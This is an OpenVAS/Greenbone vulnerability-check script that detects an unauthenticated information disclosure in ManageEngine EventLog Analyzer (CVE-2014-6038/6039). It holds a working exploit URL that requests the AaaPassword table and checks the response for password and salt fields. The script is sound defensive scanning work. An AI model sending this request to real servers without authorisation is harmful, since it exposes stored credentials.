CPE = "cpe:/a:zohocorp:manageengine_eventlog_analyzer";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105111" );
	script_cve_id( "CVE-2014-6038", "CVE-2014-6039" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2021-05-04T04:36:43+0000" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "ManageEngine EventLog Analyzer Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_eventlog_info_disc.txt" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker read usernames and passwords." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "affected", value: "All versions from v7 to v9.9 build 9002." );
	script_tag( name: "summary", value: "ManageEngine EventLog Analyzer is prone to an information disclosure vulnerability." );
	script_tag( name: "last_modification", value: "2021-05-04 04:36:43 +0000 (Tue, 04 May 2021)" );
	script_tag( name: "creation_date", value: "2014-11-06 16:38:34 +0100 (Thu, 06 Nov 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_manageengine_eventlog_analyzer_detect.sc" );
	script_mandatory_keys( "manageengine/eventlog_analyzer/http/detected" );
	script_require_ports( "Services/www", 8400 );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
url = "/agentHandler?mode=getTableData&table=AaaPassword";
if(http_vuln_check( port: port, url: url, pattern: "AaaPassword createdtime", extra_check: make_list( "password",
	 "password_id",
	 "salt" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

